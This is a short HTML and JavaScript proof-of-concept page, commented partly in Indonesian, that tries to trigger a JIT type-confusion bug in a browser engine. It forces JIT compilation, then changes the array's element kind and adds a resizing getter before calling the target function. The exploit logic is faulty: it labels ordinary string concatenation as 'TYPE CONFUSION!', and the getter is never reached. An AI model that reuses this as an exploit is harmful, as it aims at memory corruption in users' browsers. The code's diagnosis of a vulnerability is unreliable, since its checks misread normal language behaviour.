<!doctype html>
<meta charset="utf-8">
<pre id="log"></pre>
<script>
const log = m => document.getElementById("log").textContent += m + "\n";

// =======================
// TARGET
// =======================
function vuln(a) {
    return a[0] + 1.1;
}

// =======================
// WARMUP (force JIT)
// =======================
let arr = [1.1, 2.2, 3.3]; // PACKED_DOUBLE

for (let i = 0; i < 100000; i++) {
    vuln(arr);
}

// =======================
// BREAK ASSUMPTION
// =======================

// ubah jadi HOLEY + OBJECT
delete arr[1];
arr[0] = {x: 42};

// getter side-effect (deterministic)
Object.defineProperty(arr, 2, {
    get() {
        arr.length = 100;
        return 2.2;
    }
});

// =======================
// TRIGGER
// =======================
let res = vuln(arr);

log("Result: " + res);

// =======================
// OBSERVATION
// =======================
if (typeof res !== "number") {
    log("TYPE CONFUSION!");
}

if (res > 1e12) {
    log("POTENTIAL LEAK: " + res);
}
</script>
